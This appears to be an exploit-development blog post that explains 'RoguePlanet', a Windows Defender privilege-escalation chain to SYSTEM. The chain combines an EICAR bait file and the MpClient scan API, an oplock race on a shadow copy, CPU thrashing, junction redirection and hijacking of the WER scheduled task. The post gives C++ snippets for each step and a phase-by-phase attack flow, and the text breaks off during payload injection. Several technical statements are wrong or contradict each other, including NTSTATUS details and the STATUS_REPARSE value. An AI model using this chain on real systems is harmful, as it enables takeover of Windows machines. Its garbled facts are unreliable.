---
title: "Nightmare-Eclipse Series: RoguePlanet — Because Even Antivirus Has Race Conditions!"
date: 2026-07-16
categories: [Exploit Dev, Windows]
tags: [windows, privilege-escalation, exploit, defender, lpe, kernel, race-condition, c++]
---

## Description

**RoguePlanet** is a Windows Defender EoP exploit by **Nightmare-Eclipse**. A single ~79000-line C++ file (mostly an embedded ISO) that chains: **ISO mounting** → **Defender MpClient API abuse** → **EICAR trigger** → **oplock-based race** → **VSS timing side-channel** → **junction redirection** → **WER scheduled task hijack** → **SYSTEM shell**.

Before the code walkthrough, we need to understand the Windows internals it exploits.

---

## Windows Internals Primer

### The Native API (NTAPI)

Windows has two API layers:

| Layer | DLL | Naming | Purpose |
|-------|-----|--------|---------|
| **Win32 API** | `kernel32.dll`, `user32.dll` | `CreateFile`, `ReadFile` | High-level, documented, what most apps use |
| **Native API (NTAPI)** | `ntdll.dll` | `NtCreateFile`, `NtSetInformationFile` | Low-level kernel interface, partially documented |

The NTAPI (`ntdll.dll`) is the **direct user-mode interface to the NT kernel**. Every Win32 API call eventually goes through ntdll → syscall into the kernel. Exploits use NTAPI directly because:
1. **More control** — `NtSetInformationFile` with `FileRenameInformationEx` allows POSIX-style renames that Win32 `MoveFile` can't do
2. **Undocumented** — Microsoft doesn't guarantee stability, making it harder for Defender to hook
3. **Bypasses Win32-layer security checks** — some checks only exist in `kernel32`, not in `ntdll`

The exploit resolves NTAPI functions at runtime:

```cpp
// RoguePlanet.cpp:30-86
NTSTATUS(WINAPI* _NtSetInformationFile)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtSetInformationFile");
```

**Why `GetProcAddress` instead of linking?** Because these functions aren't in the standard import libraries (.lib). The WDK has them, but including the WDK is heavy. Dynamic resolution is cleaner.

---

### NTSTATUS

Every NTAPI function returns `NTSTATUS` — a 32-bit code split into:

| Bits | Field | Meaning |
|------|-------|---------|
| 31 | Severity | 0=success, 1=error |
| 30 | Customer | 0=Microsoft, 1=ISV |
| 29 | Reserved | Must be 0 |
| 28 | Facility | Which subsystem (0x000=IO, 0x007=Win32, etc.) |
| 0-15 | Code | Specific status |

Common values used in the exploit:

```
STATUS_SUCCESS                  = 0x00000000
STATUS_SHARING_VIOLATION        = 0xC0000043  (Severity=1, Facility=IO, Code=0x0043)
STATUS_NO_SUCH_DEVICE           = 0xC000000E
STATUS_PENDING                  = 0x00000103  (Success severity, async operation)
```

The check pattern is `if (stat == STATUS_SUCCESS)` — never `if (stat)`, because success codes aren't zero.

---

### Windows Object Manager

The NT kernel has an **Object Manager** (`\SeObjectManager`) that maintains a hierarchical namespace of all kernel objects. Every named kernel object lives here:

```
\GLOBAL??\C:              → Symbolic link to \Device\HarddiskVolume3
\Device\HarddiskVolume3   → Actual volume device object
\Device\CdRom0            → CD/DVD/ISO device
\Device\HarddiskVolumeShadowCopy1  → VSS snapshot
\BaseNamedObjects\...     → Mutexes, events, semaphores
```

The exploit uses this extensively — it opens `\Device` as a directory object and enumerates its children to find VSS volumes:

```cpp
// RoguePlanet.cpp:77793-77810
_NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);  // Open \Device
// Query all objects in \Device directory
_NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
```

---

### The NT Namespace (`\??\`, `\Device\`, `\GLOBAL??\`)

Paths in NT can start with:

| Prefix | Meaning | Example |
|--------|---------|---------|
| `\??\` | Dos device path (resolved via `\GLOBAL??\`) | `\??\C:\Windows` = `C:\Windows` |
| `\Device\` | Kernel device namespace | `\Device\CdRom0` |
| `\GLOBAL??\` | Global DOS device directory | `\GLOBAL??\C:` |

The exploit uses `\??\` paths consistently — these are the NT equivalent of Win32 paths:

```cpp
// RoguePlanet.cpp:78751-78756
CreateJunction(hdir, L"\\??\\...\\wdtest_temp");
```

When you call `CreateFile("C:\\foo")`, kernel32 translates it to `\??\C:\foo`, which resolves through `\GLOBAL??\C:` → `\Device\HarddiskVolume3\foo`.

---

### NtCreateFile vs CreateFile

`NtCreateFile` is the NTAPI equivalent of `CreateFile`. It takes an `OBJECT_ATTRIBUTES` structure instead of a simple path:

```cpp
// OBJECT_ATTRIBUTES structure
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;             // sizeof(OBJECT_ATTRIBUTES)
    HANDLE          RootDirectory;      // Optional root handle for relative paths
    PUNICODE_STRING ObjectName;         // Path
    ULONG           Attributes;         // OBJ_CASE_INSENSITIVE, etc.
    PVOID           SecurityDescriptor; // NULL = default
    PVOID           SecurityQualityOfService; // Impersonation level
} OBJECT_ATTRIBUTES;
```

The exploit wraps `NtCreateFile` in a helper macro that builds `OBJECT_ATTRIBUTES` and `IO_STATUS_BLOCK`:

```cpp
HANDLE hfile = NtCreateFile(L"\\??\\%s\\wermgr.exe", GENERIC_READ, ...);
```

**Why NtCreateFile over CreateFile?** NTAPI gives access to `FILE_SUPERSEDE` (which atomically replaces a file even if open), `FILE_OPEN_IF`, and file operations with `DELETE` access that are needed for `NtSetInformationFile` renames.

---

### IO_STATUS_BLOCK

Every NTAPI I/O operation returns an `IO_STATUS_BLOCK`:

```cpp
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;      // Final status
        PVOID    Pointer;     // Internal use
    };
    ULONG_PTR Information;    // Bytes transferred / specific info
} IO_STATUS_BLOCK;
```

Exploit pattern:
```cpp
IO_STATUS_BLOCK iostat;
NTSTATUS stat = NtCreateFile(..., &iostat, ...);
```

After a successful `NtCreateFile`, `iostat.Information` contains `FILE_OPENED` (1), `FILE_CREATED` (2), or `FILE_OVERWRITTEN` (3).

---

### RtlInitUnicodeString

```cpp
typedef struct _UNICODE_STRING {
    USHORT Length;         // Length in bytes (not including null)
    USHORT MaximumLength;  // Buffer capacity
    PWSTR  Buffer;         // Wide string
} UNICODE_STRING;
```

NTAPI uses `UNICODE_STRING` instead of raw `wchar_t*` because it carries the length explicitly (no null termination needed, binary-safe):

```cpp
UNICODE_STRING adsname = { 0 };
RtlInitUnicodeString(&adsname, L":WDFOO");  // Length=10, MaximumLength=12, Buffer→":WDFOO"
```

---

### Access Masks

Every handle has an **access mask** specifying what operations are allowed:

| Mask | Value | Meaning |
|------|-------|---------|
| `GENERIC_READ` | 0x80000000 | Map to `FILE_GENERIC_READ` |
| `GENERIC_WRITE` | 0x40000000 | Map to `FILE_GENERIC_WRITE` |
| `GENERIC_EXECUTE` | 0x20000000 | Map to `FILE_GENERIC_EXECUTE` |
| `DELETE` | 0x00010000 | Allows `NtSetInformationFile(FileDispositionInfo)` |
| `SYNCHRONIZE` | 0x00100000 | Allows waiting on the handle |
| `FILE_READ_ATTRIBUTES` | 0x0080 | Read file metadata |

The exploit opens files with `GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE` — it needs `DELETE` for rename operations and `SYNCHRONIZE` to wait on async operations.

---

### File Dispositions

When creating/opening a file, the **disposition** controls what happens if the file exists/doesn't exist:

| Disposition | Exists | Doesn't exist |
|------------|--------|---------------|
| `FILE_SUPERSEDE` | Replace (atomically) | Create |
| `FILE_CREATE` | Fail (STATUS_OBJECT_NAME_COLLISION) | Create |
| `FILE_OPEN` | Open | Fail (STATUS_OBJECT_NAME_NOT_FOUND) |
| `FILE_OPEN_IF` | Open | Create |
| `FILE_OVERWRITE_IF` | Overwrite | Create |

`FILE_SUPERSEDE` is unique — it **atomically** replaces a file even if other handles are open. The old file is renamed to a temporary name, and the new file takes its place. The exploit uses this to force-open files that Defender might have locked.

---

### File Sharing Modes

NT allows three sharing flags when opening a file:

| Flag | Others can... |
|------|---------------|
| `FILE_SHARE_READ` | Read |
| `FILE_SHARE_WRITE` | Write |
| `FILE_SHARE_DELETE` | Rename/delete |

If you open a file with `FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE`, you're saying "I'm fine with anyone else doing anything to this file." The exploit uses this aggressively to avoid lock conflicts.

---

### OPLOCKs (Opportunistic Locks)

Oplocks are a **cache coherence protocol** between multiple file system clients. Used originally for network redirectors (SMB), they let a client cache file data locally until another client needs access.

The exploit uses **oplocks as a synchronization primitive**:

```cpp
// RoguePlanet.cpp:78727
REQUEST_OPLOCK_INPUT_BUFFER opin = { 0 };
opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
DeviceIoControl(hvss, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, ..., &ov, NULL);
WaitForSingleObject(ov.hEvent, INFINITE);  // Block until oplock breaks
```

**OPLOCK_LEVEL_CACHE_READ** — the oplock owner can cache reads. When another open occurs, the oplock breaks → the event is signaled.

**OPLOCK_LEVEL_CACHE_HANDLE** — the oplock owner can cache handle state (metadata). When another handle operation occurs, the oplock breaks.

When the exploit takes an oplock on the VSS copy of the EICAR file, and then Defender's cleanup completes releasing the VSS, the oplock break signals "Defender is done." **This is the precise timing oracle.**

Windows supports multiple oplock levels:

| Level | Flag | Allows caching |
|-------|------|----------------|
| Level 1 (exclusive) | `OPLOCK_LEVEL_CACHE_READ \| OPLOCK_LEVEL_CACHE_HANDLE \| OPLOCK_LEVEL_CACHE_WRITE` | Reads, writes, handles |
| Level 2 | `OPLOCK_LEVEL_CACHE_READ` | Reads only |
| Batch | `OPLOCK_LEVEL_CACHE_READ \| OPLOCK_LEVEL_CACHE_HANDLE \| OPLOCK_LEVEL_CACHE_WRITE` | Like Level 1, with batch semantics |
| RH | `OPLOCK_LEVEL_CACHE_READ \| OPLOCK_LEVEL_CACHE_HANDLE` | Reads and handle metadata |

The exploit uses **RH** level — it wants to know when anyone accesses the file (read or handle operation), which corresponds to Defender closing the VSS.

---

### Reparse Points

Reparse points are NTFS metadata that **redirect file operations**. When the filesystem encounters a file/directory with a reparse point, it returns `STATUS_REPARSE` (0xC0000030), and the I/O Manager re-issues the operation to the target.

Types of reparse points:

| Tag | Type | Target encoding |
|-----|------|----------------|
| `IO_REPARSE_TAG_MOUNT_POINT` (0xA0000003) | Directory junction / volume mount point | NT path (`\??\...`) |
| `IO_REPARSE_TAG_SYMLINK` (0xA000000C) | Symbolic link | Win32 or NT path |
| `IO_REPARSE_TAG_AF_UNIX` (0x80000023) | Unix socket | Special |

The exploit uses `IO_REPARSE_TAG_MOUNT_POINT`:

```cpp
// RoguePlanet.cpp:78299-78344
rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
// Set substitute name to \??\target\
rdb->MountPointReparseBuffer.SubstituteNameLength = target_sz;
memcpy(rdb->MountPointReparseBuffer.PathBuffer, target, target_sz + 2);
DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
```

The `REPARSE_DATA_BUFFER` structure:

```cpp
typedef struct {
    ULONG  ReparseTag;         // Tag identifying reparse point type
    USHORT ReparseDataLength;  // Length of data after header
    USHORT Reserved;
    union {
        struct {               // For IO_REPARSE_TAG_MOUNT_POINT
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];  // Both names stored here
        } MountPointReparseBuffer;
        struct {               // For IO_REPARSE_TAG_SYMLINK
            // ... similar but with flags
        } SymbolicLinkReparseBuffer;
    };
} REPARSE_DATA_BUFFER;
```

**Why junctions instead of symlinks?** Junctions (`IO_REPARSE_TAG_MOUNT_POINT`) don't require `SeCreateSymbolicLinkPrivilege`, which only administrators have. Junctions can be created by any user with write access to the directory.

**Why `FSCTL_SET_REPARSE_POINT` instead of `CreateSymbolicLink`?** `FSCTL_SET_REPARSE_POINT` is a direct DeviceIoControl call that writes reparse data to the on-disk attribute. `CreateSymbolicLink` is a Win32 API that checks privileges. By using the NT path (`\??\...`) in the junction, the exploit can redirect to arbitrary locations — including `\Device\CdRom0` or `C:\Windows`.

**FSCTL_DELETE_REPARSE_POINT** removes the reparse attribute. After the exploit overwrites Defender's temp file with its payload, it deletes the junction so Windows doesn't try to follow it during the WER task execution.

---

### Volume Shadow Copy (VSS)

VSS creates point-in-time snapshots of volumes. When Defender quarantines a file, it triggers VSS to create a backup before modification. RoguePlanet detects this by polling the NT Object Manager for new `HarddiskVolumeShadowCopy*` devices.

VSS device naming: `\Device\HarddiskVolumeShadowCopy{N}` where `N` increments with each snapshot.

**Why VSS matters:** The exploit accesses the EICAR file via the VSS path (specifically the `:WDFOO` ADS stream on the VSS copy). By taking an oplock on the VSS path, it knows exactly when Defender finishes its cleanup and releases the VSS.

---

### Alternate Data Streams (ADS)

NTFS supports multiple data streams per file: `file:streamname`. Every file has a default unnamed stream (`::$DATA`). ADS are commonly:

| Stream | Purpose |
|--------|---------|
| `::$DATA` (default) | Main file content |
| `:Zone.Identifier:$DATA` | Mark of the Web (downloaded file origin) |
| `:WDFOO` | Custom — exploit uses this as VSS marker |

```cpp
// RoguePlanet.cpp:78228-78248
RtlInitUnicodeString(&adsname, L":WDFOO");  // Opens :WDFOO ADS on the EICAR file
HANDLE hstream = NULL;
stat = NtCreateFile(&hstream, GENERIC_WRITE | SYNCHRONIZE, &oa_ads, NULL, ...);
// Writes 0x1000 bytes of zeros to the ADS
WriteFile(hstream, eicar2, 0x1000, &writtenbytes, &ovp);
```

The exploit writes data to `wermgr.exe:WDFOO` on the original file, then later reads `wermgr.exe:WDFOO` from the VSS copy. If the ADS exists in the VSS, it means Defender quarantined the correct file (the VSS captured the state *before* quarantine).

---

### Named Pipes

Named pipes provide **inter-process communication** (IPC) between processes, possibly across sessions and integrity levels. The exploit creates:

```cpp
// RoguePlanet.cpp:78582
HANDLE hpipe = CreateNamedPipe(L"\\\\.\\pipe\\RoguePlanet", 
    PIPE_ACCESS_DUPLEX,  // Bidirectional
    PIPE_WAIT,           // Blocking mode
    PIPE_UNLIMITED_INSTANCES,  // Multiple connections
    4096, 4096, 0, NULL, NULL);
```

Key concepts:

- **`PIPE_ACCESS_DUPLEX`** — Both client and server can read/write
- **`PIPE_WAIT`** — `ConnectNamedPipe` blocks until a client connects
- **`PIPE_UNLIMITED_INSTANCES`** — Any number of pipe instances allowed
- **`\\.\pipe\`** — The local named pipe filesystem (NPFS) mount point

When the SYSTEM-level payload connects back:

```cpp
// RoguePlanet.cpp:78553-78566
HANDLE hclient = CreateFile(L"\\\\.\\pipe\\RoguePlanet", ...);
DWORD sesid = 0;
GetNamedPipeServerSessionId(hclient, &sesid);  // Get session ID of pipe server
CloseHandle(hclient);
LaunchConsoleInSessionId(sesid);
```

**`GetNamedPipeServerSessionId`** retrieves the Terminal Services session ID from the pipe's server process — this is how the SYSTEM instance learns which session to spawn the console in.

---

### Win32 Services and Sessions

Windows supports multiple **sessions** (Terminal Services / Fast User Switching):
- **Session 0:** Services (isolated)
- **Session 1+:** User sessions

A process running as SYSTEM in Session 0 can't directly interact with Session 1's desktop (Session 0 Isolation). Named pipes traverse sessions, but window handles don't. Hence the need to duplicate the token and set the session ID.

---

### Token Duplication and Privileges

Every process has an **access token** containing its SID, group memberships, privileges, and session ID.

**Privileges enabled in the exploit:**

| Privilege | Constant | What it allows |
|-----------|----------|----------------|
| `SeTcbPrivilege` | `SE_TCB_NAME` | Act as part of the operating system — needed to set session ID |
| `SeAssignPrimaryTokenPrivilege` | `SE_ASSIGNPRIMARYTOKEN_NAME` | Assign primary token to a process |
| `SeImpersonatePrivilege` | `SE_IMPERSONATE_NAME` | Impersonate another user |
| `SeDebugPrivilege` | `SE_DEBUG_NAME` | Debug any process |

**SetPrivilege** enables a privilege in the token:

```cpp
void SetPrivilege(HANDLE htoken, LPCTSTR privname, BOOL enable) {
    TOKEN_PRIVILEGES tp;
    LookupPrivilegeValue(NULL, privname, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
    AdjustTokenPrivileges(htoken, FALSE, &tp, sizeof(tp), NULL, NULL);
}
```

**DuplicateTokenEx** creates a new token copy, then **SetTokenInformation** changes its session ID:

```cpp
DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, 
    SecurityDelegation, TokenPrimary, &hnewtoken);
SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
```

`TokenPrimary` makes it a primary token (can start a process). `SecurityDelegation` is the highest impersonation level (can act as the user on remote systems).

---

### IsRunningAsLocalSystem

```cpp
// RoguePlanet.cpp:part of main() at 78553
bool IsRunningAsLocalSystem() {
    HANDLE htoken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken);
    // Get token user SID
    GetTokenInformation(htoken, TokenUser, tinfo, bufsz, &retsz);
    // Check if it's LocalSystem
    SID* localsys = NULL;
    SID_IDENTIFIER_AUTHORITY ntia = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&ntia, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &localsys);
    return EqualSid((SID*)tinfo->User.Sid, localsys);
}
```

The **SYSTEM SID** is `S-1-5-18` (one sub-authority under the NT authority `S-1-5`). The `EqualSid` function compares two SIDs for equality.

---

### Virtual Disk API

The exploit uses `OpenVirtualDisk` and `AttachVirtualDisk` from `virtdisk.dll` (part of Windows since Vista SP1):

```cpp
VIRTUAL_STORAGE_TYPE vst = { 
    VIRTUAL_STORAGE_TYPE_DEVICE_ISO,  // Device type = ISO
    {0x53f56311-b6bf-11d0-94f2-00a0c91efb8b}  // GUID for ISO
};
OpenVirtualDisk(&vst, iso_path, 
    VIRTUAL_DISK_ACCESS_GET_INFO | VIRTUAL_DISK_ACCESS_ATTACH_RO | VIRTUAL_DISK_ACCESS_DETACH, 
    OPEN_VIRTUAL_DISK_FLAG_NONE, NULL, &hvirtdisk);
AttachVirtualDisk(hvirtdisk, NULL, 
    ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER, 
    NULL, NULL, NULL);
```

**`VIRTUAL_STORAGE_TYPE_DEVICE_ISO`** tells the VDS to treat the file as an ISO image, creating a virtual CD-ROM device (`\Device\CdRomX`).

**`ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER`** prevents Windows from assigning a drive letter — the ISO appears only in the device namespace, making it less visible.

---

### FileRenameInformation and RENAME_POSIX_SEMANTICS

The NT `FileRenameInformationEx` info class (replaces the older `FileRenameInformation`) allows:

```cpp
typedef struct {
    ULONG Flags;                              // 0x01=REPLACE_IF_EXISTS, 0x40=RENAME_POSIX_SEMANTICS
    HANDLE RootDirectory;                     // Root for relative rename
    ULONG FileNameLength;                     // Length in bytes
    WCHAR FileName[1];                        // New name
} FILE_RENAME_INFORMATION;
```

**`RENAME_POSIX_SEMANTICS`** (0x40) makes the rename behave like POSIX `rename()` — it succeeds even if the file has other open handles (POSIX allows renaming open files). Without this flag, `STATUS_SHARING_VIOLATION` is returned.

The exploit's `MoveToTempDir` retries infinitely on `STATUS_SHARING_VIOLATION` — this is the **aggressive race** pattern:

```cpp
do {
    NTSTATUS stat = _NtSetInformationFile(hobj, &iostat, fri, ..., FileRenameInformationEx);
    if (stat == STATUS_SUCCESS) return true;
    if (stat == STATUS_SHARING_VIOLATION) continue;  // Spin!
} while (1);
```

---

### ReadDirectoryChangesW

This API monitors a directory for file system changes. Instead of polling, the kernel queues `FILE_NOTIFY_INFORMATION` records that the caller reads asynchronously:

```cpp
FILE_NOTIFY_INFORMATION:
    ULONG NextEntryOffset;     // Offset to next record (0 = last)
    ULONG Action;              // FILE_ACTION_ADDED, REMOVED, MODIFIED, RENAMED_OLD/NEW, etc.
    ULONG FileNameLength;      // Length in bytes
    WCHAR FileName[1];         // Variable-length filename
```

The exploit calls it with `FILE_NOTIFY_CHANGE_FILE_NAME` and `FILE_NOTIFY_CHANGE_SIZE` to detect Defender's temp file creation and file size changes:

```cpp
ReadDirectoryChangesW(hwin, buff, sizeof(buff), TRUE, 
    FILE_NOTIFY_CHANGE_FILE_NAME, &retbytes, NULL, NULL);
// Check if filename is exactly "Temp\TMP" + 16 chars (24 total)
if (pfni->FileNameLength / 2 != 24 || _wcsnicmp(&pfni->FileName[0], teststr, 8) != 0)
    continue;
```

The check `FileNameLength / 2 != 24` verifies that the filename is exactly 24 wide characters. Defender's quarantine temp files use the pattern `Temp\TMPXXXX.tmp` — 24 characters including the `Temp\` prefix.

---

### BCryptGenRandom

The exploit uses the Cryptography API: Next Generation (CNG) for secure random data:

```cpp
BCryptGenRandom(NULL, (PUCHAR)g_poseidonbuf, sizeof(g_poseidonbuf), 
    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
```

**BCRYPT_USE_SYSTEM_PREFERRED_RNG** tells BCrypt to use Windows' preferred random number generator (the FIPS-approved AES-CTR DRBG seeded from the kernel's CSPRNG). This is cryptographically secure, though the exploit only needs randomness for CPU thrashing, not cryptography.

---

### MpClient.dll (Defender Client API)

The exploit dynamically loads Defender's internal client library from its installation path:

```cpp
GetWDInstallDir(dllpath);  // Reads HKLM\SOFTWARE\Microsoft\Windows Defender\InstallLocation
wcscat(dllpath, L"MpClient.dll");
HMODULE hm = LoadLibrary(dllpath);
```

MpClient exports undocumented functions for programmatic scanning:

| Function | Purpose |
|----------|---------|
| `MpManagerOpen` | Get a handle to the Defender manager |
| `MpScanStart` | Begin a scan on a file/resource |
| `MpScanResult` | Wait for scan to complete |
| `MpThreatOpen` | Open the threat enumeration |
| `MpThreatEnumerate` | List detected threats |
| `MpCleanOpen` | Open a cleanup context |
| `MpCleanStart` | Start cleanup with a callback |
| `MpHandleClose` | Close a handle |

**Why this works:** MpClient is a documented component of Windows Defender, but `MpScanStart/MpCleanStart` are nominally for internal use. They don't require elevation — **any user can trigger a Defender scan programmatically**. This is the entry point: a standard user asks Defender to scan the EICAR file, and Defender obliges.

The scan resource path:

```cpp
MPRESOURCE_INFO scaninfo = { 0 };
scaninfo.Scheme = L"file";
scaninfo.Path = L"%TEMP%\\RP_<GUID>\\System32\\wermgr.exe";
```

The threat check:

```cpp
_MpThreatEnumerate(threatctx, &tinfo);
if (tinfo->ThreatStatus != 0x1) { /* EICAR not detected? */ }
```

`ThreatStatus == 1` means known malware detected. EICAR always triggers this.

---

### Windows Error Reporting (WER)

WER is the crash/error reporting subsystem. It runs scheduled tasks for error reporting, including **QueueReporting** — a task that executes `wermgr.exe` (Windows Error Reporting Manager) when there are pending error reports.

The exploit writes its payload as `wermgr.exe` and uses a junction to redirect `%SystemRoot%\System32\wermgr.exe` to the payload. When the WER scheduled task triggers (which runs as SYSTEM), it executes the payload instead of the real wermgr.exe.

**Why WER specifically:** WER's QueueReporting task runs as SYSTEM, `wermgr.exe` isn't a protected process, and WER doesn't validate the binary's digital signature before execution.

**WER task location:** `%SystemRoot%\System32\Tasks\Microsoft\Windows\Windows Error Reporting\QueueReporting`

---

### PoseidonThread — CPU Saturation

The "Poseidon" threads (named after the Greek god of the sea and earthquakes — fitting for a chaos technique) serve to **widen the race window**:

```cpp
// Generator thread (1 instance)
DWORD WINAPI PoseidonGeneratorThread(void*) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    do {
        BCryptGenRandom(NULL, (PUCHAR)g_poseidonbuf, sizeof(g_poseidonbuf), 
            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    } while (!g_poseidonexit);
}

// Writer threads (1 per CPU core)
DWORD WINAPI PoseidonThread(void*) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    HANDLE hfile = CreateFile(target, GENERIC_ALL, NULL, NULL, CREATE_NEW,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    do {
        SetFilePointer(hfile, 0, NULL, FILE_BEGIN);
        WriteFile(hfile, g_poseidonbuf, 0x1000, &ret, NULL);
    } while (!g_poseidonexit);
}
```

```cpp
// Spawn in main():
GetSystemInfo(&sysinfo);
if (sysinfo.dwNumberOfProcessors > 3) {
    CreateThread(NULL, NULL, PoseidonGeneratorThread, NULL, NULL, &tid);
    for (int i = 0; i < sysinfo.dwNumberOfProcessors; i++) {
        CreateThread(NULL, NULL, PoseidonThread, NULL, NULL, &tid0);
    }
}
```

How this works:
1. **Generator thread** continuously fills a shared buffer with random data via `BCryptGenRandom` (CNG API)
2. **N writer threads** (one per CPU core) open a temp file with `FILE_FLAG_DELETE_ON_CLOSE` (auto-deletes on handle close), then loop writing the random buffer to it
3. All threads run at `THREAD_PRIORITY_BELOW_NORMAL` — below normal priority so they don't freeze the system, but still consume CPU time
4. Each iteration seeks to the start and writes 4096 bytes — constant file I/O

This saturates the disk subsystem and the CPU's I/O processing, causing Defender's scan/cleanup operations to take longer. A longer operation means a larger race window.

**Why `FILE_FLAG_DELETE_ON_CLOSE`?** So the exploit doesn't need to clean up these temp files — they vanish when the handle closes.

**Why only on >3 processors?** Below 4 cores, you'd risk making the system unresponsive; the race window likely isn't needed on slow hardware anyway.

---

## The Embedded ISO (Lines 463-462+)

The first ~78000 lines contain:

**1. NT API typedefs and macros** — All function pointer types for `NtCreateFile`, `NtSetInformationFile`, `NtDeleteFile`, etc. These match the exact signatures from the WDK but defined inline to avoid the WDK dependency.

**2. SYSTEM_INFORMATION_CLASS enum** — A complete copy of every value from the WDK's `ntdll.h`. This is needed for `NtQuerySystemInformation` calls, which use info class codes.

**3. rawData[917504]** — A pre-assembled ISO9660 filesystem image:

```cpp
unsigned char rawData[917504] = { 0x00, 0x00, 0x00, 0x00, ... };
```

917,504 bytes = ~896 KB. ISO9660 format, containing a single file `\wermgr.exe` which is the EICAR test string. The ISO was likely built with `mkisofs` or similar and then `xxd -i`'d into a C array.

**Why embed the ISO instead of creating EICAR at runtime?** Mounted ISOs are read-only. If the exploit writes EICAR directly, Defender could detect it during the scan and quarantine it, altering the file system state. With a read-only ISO, the exploit can re-read the original EICAR at any time from the device path `\Device\CdRom0\wermgr.exe`.

---

## Full Function Reference Table

| Function | Lines | Purpose |
|----------|-------|---------|
| `main()` | 78549-79002 | Orchestrator — all phases |
| `MountISO()` | 78346-78392 | Extract embedded ISO and mount as virtual CD-ROM |
| `WriteEicar()` | 78156-78257 | Create EICAR bait file with ADS marker stream |
| `WDStartScan()` | 77986-78152 | Trigger Defender scan via MpClient API |
| `PoseidonThread()` | 78521-78547 | Writer thread — CPU/disk thrashing |
| `PoseidonGeneratorThread()` | 78508-78520 | Generator thread — feeds random data |
| `MoveToTempDir()` | 78260-78297 | Aggressive rename with POSIX semantics |
| `CreateJunction()` | 78299-78344 | Set reparse point on directory |
| `ShadowCopyFinderThread()` | 77764-77945 | Poll NT Object Manager for new VSS volumes |
| `MpCleanCallbackFunction()` | 77948-77953 | Minimal callback for Defender cleanup |
| `LaunchConsoleInSessionId()` | 78463-78498 | Spawn conhost.exe as user |
| `IsRunningAsLocalSystem()` | ~78553 | Check if current token is SYSTEM |
| `RetrieveCurrentVSSList()` | ~77930 | Get baseline VSS volume list |
| Global data | 463 | rawData[917504] embedded ISO |

---

## Step-by-Step Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ PHASE 1: Setup                                                               │
│                                                                              │
│ 1. Mount embedded ISO as read-only virtual CD-ROM (MountISO)                 │
│    → \Device\CdRomX with wermgr.exe (actually EICAR test file)              │
│                                                                              │
│ 2. Create %TEMP%\RP_<GUID>\System32\wermgr.exe (WriteEicar - first call)     │
│    → Copy EICAR from ISO device path to temp location                        │
│    → Write 4096 zero bytes to :WDFOO ADS on the file                        │
│                                                                              │
│ 3. Create named pipe \\.\pipe\RoguePlanet for SYSTEM handoff                 │
│                                                                              │
│ 4. Set oplock on C:\Windows (watchdog) + start directory change monitoring   │
└──────────────────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ PHASE 2: Race Trigger                                                        │
│                                                                              │
│ 5. Start Poseidon threads → thrash CPU/disk (widens race window)             │
│                                                                              │
│ 6. Call WDStartScan on the EICAR file via MpClient.dll:                      │
│    → MpManagerOpen → MpScanStart → MpScanResult → MpThreatOpen               │
│    → MpThreatEnumerate (ThreatStatus==1 → EICAR detected)                   │
│    → MpCleanOpen → MpCleanStart (triggers quarantine)                       │
│                                                                              │
│ 7. Defender quarantine creates Temp\TMPXXXX.tmp in C:\Windows\Temp           │
│    and initiates VSS snapshot                                                 │
└──────────────────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ PHASE 3: Oplock Timing & Directory Redirection                               │
│                                                                              │
│ 8. ShadowCopyFinderThread detects new HarddiskVolumeShadowCopyN               │
│    → Opens the VSS copy of wermgr.exe:WDFOO                                  │
│    → Takes FSCTL_REQUEST_OPLOCK on VSS path                                  │
│    → Waits for oplock break → signals "Defender is done with VSS"           │
│                                                                              │
│ 9. Close EICAR file handle                                                  │
│                                                                              │
│ 10. Set junction: System32 → wdtest_temp (re-directs file create)            │
│    → Now any file created under System32\ actually goes to wdtest_temp\      │
│                                                                              │
│ 11. Lock original EICAR on ISO path (prevents Defender re-scan)              │
│    → LockFile(hlock1, NULL, NULL, MAXDWORD, MAXDWORD)                        │
└──────────────────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ PHASE 4: Payload Injection                                                    │
│                                                                              │
│ 12. WriteEicar (second call) → re-creates EICAR in new System32 location     │
│                                                                              │
│ 13. Wait for FILE_NOTIFY_CHANGE_SIZE on wdtest_temp directory                │
│    → Defender's cleanup operation creates/modifies a file here               │
│    → Get the temp filename                                                   │
│                                                                              │
│ 14. Open Defender's temp file, lock it, overwrite with exploit's own PE:     │
